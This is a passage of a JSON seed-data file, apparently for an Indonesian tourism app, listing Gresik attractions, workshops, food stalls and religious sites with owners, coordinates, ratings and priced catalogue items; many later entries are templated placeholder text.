                        "price": 15000,
                        "description": "Akses bangku penonton barisan depan pentas sanggring."
                    }
                ]
            },
            {
                "id": "m88",
                "name": "Sanggar Seni Wayang Kulit Cerme",
                "owner": "Ki Dalang Wardoyo",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pembuatan wayang kulit tatah berbahan kulit kerbau asli dengan pewarnaan cat serbuk emas prada kuno.",
                "coords": [
                    -7.215,
                    112.551
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c88_1",
                        "name": "Wayang Tokoh Gunungan (Sedang)",
                        "price": 250000,
                        "description": "Hiasan wayang kulit gunungan tatah rapi tiang bambu wulung."
                    }
                ]
            },
            {
                "id": "m89",
                "name": "Museum Sunan Giri",
                "owner": "Upt Museum Sunan Giri",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Museum sejarah menyimpan peninggalan prasejarah, keramik kuno dinasti Ming, naskah daun lontar kuno, dan pusaka sunan Giri.",
                "coords": [
                    -7.173,
                    112.6315
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c89_1",
                        "name": "Tiket Masuk Museum",
                        "price": 5000,
                        "description": "Akses ke seluruh galeri peninggalan arkeologi wali."
                    }
                ]
            },
            {
                "id": "m90",
                "name": "Konservasi Mangrove Ujungpangkah",
                "owner": "Dinas Perikanan & Kelautan Gresik",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat penelitian pelestarian ekosistem rawa pantai Manyar, dilengkapi pemandu penjelasan fungsi mangrove penahan abrasi.",
                "coords": [
                    -6.891,
                    112.555
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c90_1",
                        "name": "Paket Menanam Bibit Mangrove",
                        "price": 25000,
                        "description": "Donasi 2 bibit mangrove dan praktik menanam langsung di lumpur pantai."
                    }
                ]
            },
            {
                "id": "m91",
                "name": "Balai Konservasi Terumbu Karang Bawean",
                "owner": "Yayasan Karang Lestari Bawean",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pembelajaran pembibitan transplantasi terumbu karang meja (Acropora) untuk mengembalikan kelestarian biota laut.",
                "coords": [
                    -5.845,
                    112.752
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c91_1",
                        "name": "Adopsi Karang (Transplantasi)",
                        "price": 50000,
                        "description": "Donasi satu bibit karang berlabel nama donatur dipasang di dasar laut."
                    }
                ]
            },
            {
                "id": "m92",
                "name": "Agrowisata Kebun Nanas Kebomas",
                "owner": "Kelompok Tani Makmur Kebomas",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Perkebunan holtikultura nanas madu di lereng bukit Kebomas, pengunjung diajarkan cara stek tunas dan memanen nanas matang.",
                "coords": [
                    -7.185,
                    112.602
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c92_1",
                        "name": "Nanas Madu Petik Sendiri (1 Pcs)",
                        "price": 15000,
                        "description": "Nanas madu matang pohon super manis petik langsung dari pohon."
                    }
                ]
            },
            {
                "id": "m93",
                "name": "Pusat Edukasi Sampah (ECO-Depo) Gresik",
                "owner": "KRL Lingkungan Suci",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?auto=format&fit=crop&w=600&q=80",
                "description": "Model pengolahan limbah sampah kering menjadi pupuk organik cair dan kerajinan bernilai jual tinggi khas daur ulang GKB.",
                "coords": [
                    -7.132,
                    112.632
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c93_1",
                        "name": "Pupuk Organik Cair (500ml)",
                        "price": 15000,
                        "description": "Pupuk cair konsentrat hasil komposting limbah daun tahura."
                    }
                ]
            },
            {
                "id": "m94",
                "name": "Kampung Edukasi Lidah Buaya",
                "owner": "KWT Srikandi Suci",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=600&q=80",
                "description": "Kampung percontohan menanam lidah buaya raksasa (Aloe Vera Chinensis) dan praktik mengolah dagingnya menjadi nata de aloe.",
                "coords": [
                    -7.136,
                    112.628
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c94_1",
                        "name": "Minuman Lidah Buaya Segar (Cup)",
                        "price": 5000,
                        "description": "Minuman herbal jeli lidah buaya rasa jeruk nipis manis."
                    }
                ]
            },
            {
                "id": "m95",
                "name": "Balai Penelitian Padi Cerme",
                "owner": "Dinas Pertanian Jatim Unit Cerme",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Sawah percontohan varietas padi unggul tahan asin rawa payau, edukasi cara menyemai bibit dan panen padi bagi pelajar.",
                "coords": [
                    -7.218,
                    112.562
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c95_1",
                        "name": "Beras Varietas Unggul (1 Kg)",
                        "price": 15000,
                        "description": "Beras pulen harum hasil riset tahan payau Cerme."
                    }
                ]
            },
            {
                "id": "m96",
                "name": "Penangkaran Penyu Abu-abu Dalegan",
                "owner": "Sahabat Penyu Dalegan",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat penyelamatan telur penyu dari predator dan edukasi melepas tukik (anak penyu) kembali ke laut bebas.",
                "coords": [
                    -6.901,
                    112.499
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c96_1",
                        "name": "Pelepasan 1 Tukik Ke Laut",
                        "price": 10000,
                        "description": "Donasi pemeliharaan sarang penyu untuk melepas satu tukik."
                    }
                ]
            },
            {
                "id": "m97",
                "name": "Kampung Susu Kambing Etawa Panceng",
                "owner": "Peternakan Etawa Barokah",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=600&q=80",
                "description": "Kawasan peternakan kambing etawa mandiri, belajar memerah susu kambing steril dan mencicipi susu aneka rasa.",
                "coords": [
                    -6.928,
                    112.465
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c97_1",
                        "name": "Susu Kambing Steril Botol (250ml)",
                        "price": 15000,
                        "description": "Susu kambing murni etawa steril aneka rasa melon/stroberi."
                    }
                ]
            },
            {
                "id": "m98",
                "name": "Perpustakaan & Pusat Kearsipan Gresik",
                "owner": "Dinas Perpustakaan Pemkab Gresik",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Perpustakaan modern dengan ribuan koleksi buku digital, arsip koran zaman kolonial Grissee, dan ruang baca anak.",
                "coords": [
                    -7.164,
                    112.651
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c98_1",
                        "name": "Kartu Pendaftaran Anggota",
                        "price": 5000,
                        "description": "Pembuatan kartu akses peminjaman buku perpustakaan daerah."
                    }
                ]
            },
            {
                "id": "m99",
                "name": "Desa Wisata Jamur Penataan",
                "owner": "KWT Jamur Penataan",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?auto=format&fit=crop&w=600&q=80",
                "description": "Desa percontohan budidaya jamur tiram putih organik, belajar pengolahan baglog hingga panen jamur segar.",
                "coords": [
                    -7.258,
                    112.512
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c99_1",
                        "name": "Paket Baglog Jamur (Isi 3)",
                        "price": 15000,
                        "description": "Baglog media tanam jamur tiram siap tumbuh di rumah."
                    }
                ]
            },
            {
                "id": "m100",
                "name": "Kampung Budi Daya Gurami Manyar",
                "owner": "Pokdakan Gurami Manyar",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=600&q=80",
                "description": "Kawasan budidaya ikan gurami unggulan Manyar, edukasi manajemen pakan pelet alami dan pembibitan gurami.",
                "coords": [
                    -7.118,
                    112.575
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c100_1",
                        "name": "Bibit Gurami Unggul (Isi 10)",
                        "price": 20000,
                        "description": "Bibit gurami ukuran 3 jari sehat siap tebar kolam."
                    }
                ]
            },
            {
                "id": "m101",
                "name": "Pengrajin Rebana Hadrah Tambak Bawean",
                "owner": "Cak Ahmad",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa pengrajin rebana hadrah yang berada di kawasan strategis Kecamatan Tambak Bawean, Gresik.",
                "coords": [
                    -7.145755,
                    112.635648
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c101_1",
                        "name": "Tiket / Menu Layanan Pengrajin Rebana Hadrah",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Pengrajin Rebana Hadrah Manyar Gresik."
                    },
                    {
                        "id": "c101_2",
                        "name": "Paket Premium Pengrajin Rebana Hadrah",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m102",
                "name": "Taman Pasir Bermain Sangkapura Bawean",
                "owner": "Cak Budi",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman pasir bermain yang berada di kawasan strategis Kecamatan Sangkapura Bawean, Gresik.",
                "coords": [
                    -7.194155,
                    112.677318
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c102_1",
                        "name": "Tiket / Menu Layanan Taman Pasir Bermain",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Pasir Bermain Manyar Gresik."
                    },
                    {
                        "id": "c102_2",
                        "name": "Paket Premium Taman Pasir Bermain",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m103",
                "name": "Sanggar Tari Kembang Kebomas",
                "owner": "Cak Lia",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa sanggar tari kembang yang berada di kawasan strategis Kecamatan Kebomas, Gresik.",
                "coords": [
                    -7.328531,
                    112.724525
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c103_1",
                        "name": "Tiket / Menu Layanan Sanggar Tari Kembang",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Sanggar Tari Kembang Manyar Gresik."
                    },
                    {
                        "id": "c103_2",
                        "name": "Paket Premium Sanggar Tari Kembang",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m104",
                "name": "Pusat Lepas Tukik Manyar",
                "owner": "Cak Roni",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat lepas tukik yang berada di kawasan strategis Kecamatan Manyar, Gresik.",
                "coords": [
                    -7.069802,
                    112.636133
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c104_1",
                        "name": "Tiket / Menu Layanan Pusat Lepas Tukik",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Lepas Tukik Manyar Gresik."
                    },
                    {
                        "id": "c104_2",
                        "name": "Paket Premium Pusat Lepas Tukik",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m105",
                "name": "Es Dawet Siwalan Gresik Kota",
                "owner": "Cak Santi",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Gresik Kota, Gresik.",
                "coords": [
                    -7.061486,
                    112.672648
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c105_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c105_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m106",
                "name": "Puncak Awan Cerme",
                "owner": "Cak Mega",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Cerme, Gresik.",
                "coords": [
                    -7.294788,
                    112.631351
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c106_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c106_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m107",
                "name": "Sentra Zikir Benjeng",
                "owner": "Cak Cak",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung sentra zikir yang berada di kawasan strategis Kecamatan Benjeng, Gresik.",
                "coords": [
                    -7.112712,
                    112.638709
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c107_1",
                        "name": "Tiket / Menu Layanan Sentra Zikir",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Zikir Manyar Gresik."
                    },
                    {
                        "id": "c107_2",
                        "name": "Paket Premium Sentra Zikir",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m108",
                "name": "Monumen Perjuangan Balongpanggang",
                "owner": "Cak Mak",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa monumen perjuangan yang berada di kawasan strategis Kecamatan Balongpanggang, Gresik.",
                "coords": [
                    -7.161446,
                    112.723261
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c108_1",
                        "name": "Tiket / Menu Layanan Monumen Perjuangan",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Monumen Perjuangan Manyar Gresik."
                    },
                    {
                        "id": "c108_2",
                        "name": "Paket Premium Monumen Perjuangan",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m109",
                "name": "Sentra Tenun Sarung Duduksampeyan",
                "owner": "Cak Haji",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa sentra tenun sarung yang berada di kawasan strategis Kecamatan Duduksampeyan, Gresik.",
                "coords": [
                    -7.454756,
                    112.635492
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c109_1",
                        "name": "Tiket / Menu Layanan Sentra Tenun Sarung",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Tenun Sarung Manyar Gresik."
                    },
                    {
                        "id": "c109_2",
                        "name": "Paket Premium Sentra Tenun Sarung",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m110",
                "name": "Taman Bunga Indah Wringinanom",
                "owner": "Cak Neng",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman bunga indah yang berada di kawasan strategis Kecamatan Wringinanom, Gresik.",
                "coords": [
                    -7.105386,
                    112.591208
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c110_1",
                        "name": "Tiket / Menu Layanan Taman Bunga Indah",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Bunga Indah Manyar Gresik."
                    },
                    {
                        "id": "c110_2",
                        "name": "Paket Premium Taman Bunga Indah",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m111",
                "name": "Kerajinan Lampion Damar Kurung Driyorejo",
                "owner": "Cak Warkop",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa kerajinan lampion damar kurung yang berada di kawasan strategis Kecamatan Driyorejo, Gresik.",
                "coords": [
                    -7.095778,
                    112.602803
                ],
                "rating": 5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c111_1",
                        "name": "Tiket / Menu Layanan Kerajinan Lampion Damar Kurung",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Kerajinan Lampion Damar Kurung Manyar Gresik."
                    },
                    {
                        "id": "c111_2",
                        "name": "Paket Premium Kerajinan Lampion Damar Kurung",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m112",
                "name": "Kebun Nanas Madu Kedamean",
                "owner": "Cak Sejarah",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa kebun nanas madu yang berada di kawasan strategis Kecamatan Kedamean, Gresik.",
                "coords": [
                    -7.366982,
                    112.726349
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c112_1",
                        "name": "Tiket / Menu Layanan Kebun Nanas Madu",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Kebun Nanas Madu Manyar Gresik."
                    },
                    {
                        "id": "c112_2",
                        "name": "Paket Premium Kebun Nanas Madu",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m113",
                "name": "Sego Ruwet Menganti",
                "owner": "Cak Keluarga",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu sego ruwet yang berada di kawasan strategis Kecamatan Menganti, Gresik.",
                "coords": [
                    -7.22871,
                    112.665177
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c113_1",
                        "name": "Tiket / Menu Layanan Sego Ruwet",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Sego Ruwet Manyar Gresik."
                    },
                    {
                        "id": "c113_2",
                        "name": "Paket Premium Sego Ruwet",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m114",
                "name": "Bukit Kapur Sidayu",
                "owner": "Cak Backpacker",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa bukit kapur yang berada di kawasan strategis Kecamatan Sidayu, Gresik.",
                "coords": [
                    -7.193491,
                    112.726821
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c114_1",
                        "name": "Tiket / Menu Layanan Bukit Kapur",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Bukit Kapur Manyar Gresik."
                    },
                    {
                        "id": "c114_2",
                        "name": "Paket Premium Bukit Kapur",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m115",
                "name": "Makam Bupati Ujungpangkah",
                "owner": "Cak Kulineran",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam bupati yang berada di kawasan strategis Kecamatan Ujungpangkah, Gresik.",
                "coords": [
                    -7.443283,
                    112.678809
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c115_1",
                        "name": "Tiket / Menu Layanan Makam Bupati",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Bupati Manyar Gresik."
                    },
                    {
                        "id": "c115_2",
                        "name": "Paket Premium Makam Bupati",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m116",
                "name": "Makam Kuno Adipati Panceng",
                "owner": "Cak Gresik",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa makam kuno adipati yang berada di kawasan strategis Kecamatan Panceng, Gresik.",
                "coords": [
                    -7.1722,
                    112.735905
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c116_1",
                        "name": "Tiket / Menu Layanan Makam Kuno Adipati",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Kuno Adipati Manyar Gresik."
                    },
                    {
                        "id": "c116_2",
                        "name": "Paket Premium Makam Kuno Adipati",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m117",
                "name": "Batik Goyor ATBM Bungah",
                "owner": "Cak AlunAlun",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa batik goyor atbm yang berada di kawasan strategis Kecamatan Bungah, Gresik.",
                "coords": [
                    -7.247498,
                    112.706142
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c117_1",
                        "name": "Tiket / Menu Layanan Batik Goyor ATBM",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Batik Goyor ATBM Manyar Gresik."
                    },
                    {
                        "id": "c117_2",
                        "name": "Paket Premium Batik Goyor ATBM",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m118",
                "name": "Taman Kota Bertingkat Tambak Bawean",
                "owner": "Cak Ziarah",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1544735716-392fe2489ffa?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman kota bertingkat yang berada di kawasan strategis Kecamatan Tambak Bawean, Gresik.",
                "coords": [
                    -7.389995,
                    112.557238
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c118_1",
                        "name": "Tiket / Menu Layanan Taman Kota Bertingkat",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Kota Bertingkat Manyar Gresik."
                    },
                    {
                        "id": "c118_2",
                        "name": "Paket Premium Taman Kota Bertingkat",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m119",
                "name": "Teater Rakyat Gresik Sangkapura Bawean",
                "owner": "Cak Sidayu",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa teater rakyat gresik yang berada di kawasan strategis Kecamatan Sangkapura Bawean, Gresik.",
                "coords": [
                    -7.151937,
                    112.637655
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c119_1",
                        "name": "Tiket / Menu Layanan Teater Rakyat Gresik",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Teater Rakyat Gresik Manyar Gresik."
                    },
                    {
                        "id": "c119_2",
                        "name": "Paket Premium Teater Rakyat Gresik",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m120",
                "name": "Pusat Karang Bawean Kebomas",
                "owner": "Cak Bawean",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat karang bawean yang berada di kawasan strategis Kecamatan Kebomas, Gresik.",
                "coords": [
                    -7.131415,
                    112.607508
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c120_1",
                        "name": "Tiket / Menu Layanan Pusat Karang Bawean",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Karang Bawean Manyar Gresik."
                    },
                    {
                        "id": "c120_2",
                        "name": "Paket Premium Pusat Karang Bawean",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m121",
                "name": "Es Dawet Siwalan Manyar",
                "owner": "Cak Ahmad",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Manyar, Gresik.",
                "coords": [
                    -7.299518,
                    112.55734
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c121_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c121_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m122",
                "name": "Puncak Awan Gresik Kota",
                "owner": "Cak Budi",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Gresik Kota, Gresik.",
                "coords": [
                    -7.236214,
                    112.598012
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c122_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c122_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m123",
                "name": "Makam Syekh Cerme",
                "owner": "Cak Lia",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam syekh yang berada di kawasan strategis Kecamatan Cerme, Gresik.",
                "coords": [
                    -7.257751,
                    112.64001
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c123_1",
                        "name": "Tiket / Menu Layanan Makam Syekh",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Syekh Manyar Gresik."
                    },
                    {
                        "id": "c123_2",
                        "name": "Paket Premium Makam Syekh",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m124",
                "name": "Benteng Pertahanan Benjeng",
                "owner": "Cak Roni",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa benteng pertahanan yang berada di kawasan strategis Kecamatan Benjeng, Gresik.",
                "coords": [
                    -7.400997,
                    112.679959
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c124_1",
